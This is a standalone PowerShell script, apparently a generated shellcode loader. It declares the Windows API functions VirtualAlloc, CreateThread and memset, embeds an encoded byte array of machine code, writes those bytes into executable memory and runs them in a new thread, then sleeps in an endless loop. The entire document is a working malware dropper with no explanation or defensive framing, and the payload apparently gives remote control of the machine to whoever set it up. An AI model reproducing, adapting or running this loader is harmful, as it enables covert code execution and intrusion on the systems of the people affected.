$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xbd,0x8c,0x9c,0x3f,0x16,0xda,0xc1,0xd9,0x74,0x24,0xf4,0x5e,0x29,0xc9,0xb1,0x47,0x31,0x6e,0x13,0x03,0x6e,0x13,0x83,0xc6,0x88,0x7e,0xca,0xea,0x78,0xfc,0x35,0x13,0x78,0x61,0xbf,0xf6,0x49,0xa1,0xdb,0x73,0xf9,0x11,0xaf,0xd6,0xf5,0xda,0xfd,0xc2,0x8e,0xaf,0x29,0xe4,0x27,0x05,0x0c,0xcb,0xb8,0x36,0x6c,0x4a,0x3a,0x45,0xa1,0xac,0x03,0x86,0xb4,0xad,0x44,0xfb,0x35,0xff,0x1d,0x77,0xeb,0x10,0x2a,0xcd,0x30,0x9a,0x60,0xc3,0x30,0x7f,0x30,0xe2,0x11,0x2e,0x4b,0xbd,0xb1,0xd0,0x98,0xb5,0xfb,0xca,0xfd,0xf0,0xb2,0x61,0x35,0x8e,0x44,0xa0,0x04,0x6f,0xea,0x8d,0xa9,0x82,0xf2,0xca,0x0d,0x7d,0x81,0x22,0x6e,0x00,0x92,0xf0,0x0d,0xde,0x17,0xe3,0xb5,0x95,0x80,0xcf,0x44,0x79,0x56,0x9b,0x4a,0x36,0x1c,0xc3,0x4e,0xc9,0xf1,0x7f,0x6a,0x42,0xf4,0xaf,0xfb,0x10,0xd3,0x6b,0xa0,0xc3,0x7a,0x2d,0x0c,0xa5,0x83,0x2d,0xef,0x1a,0x26,0x25,0x1d,0x4e,0x5b,0x64,0x49,0xa3,0x56,0x97,0x89,0xab,0xe1,0xe4,0xbb,0x74,0x5a,0x63,0xf7,0xfd,0x44,0x74,0xf8,0xd7,0x31,0xea,0x07,0xd8,0x41,0x22,0xc3,0x8c,0x11,0x5c,0xe2,0xac,0xf9,0x9c,0x0b,0x79,0xad,0xcc,0xa3,0xd2,0x0e,0xbd,0x03,0x83,0xe6,0xd7,0x8c,0xfc,0x17,0xd8,0x47,0x95,0xb2,0x22,0x0f,0x5f,0x42,0x2e,0x67,0x37,0x41,0x30,0x76,0x73,0xcc,0xd6,0x12,0x93,0x99,0x41,0x8a,0x0a,0x80,0x1a,0x2b,0xd2,0x1e,0x67,0x6b,0x58,0xad,0x97,0x25,0xa9,0xd8,0x8b,0xd1,0x59,0x97,0xf6,0x77,0x65,0x0d,0x9c,0x77,0xf3,0xaa,0x37,0x20,0x6b,0xb1,0x6e,0x06,0x34,0x4a,0x45,0x1d,0xfd,0xde,0x26,0x49,0x02,0x0f,0xa7,0x89,0x54,0x45,0xa7,0xe1,0x00,0x3d,0xf4,0x14,0x4f,0xe8,0x68,0x85,0xda,0x13,0xd9,0x7a,0x4c,0x7c,0xe7,0xa5,0xba,0x23,0x18,0x80,0x3a,0x1f,0xcf,0xec,0x48,0x71,0xd3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};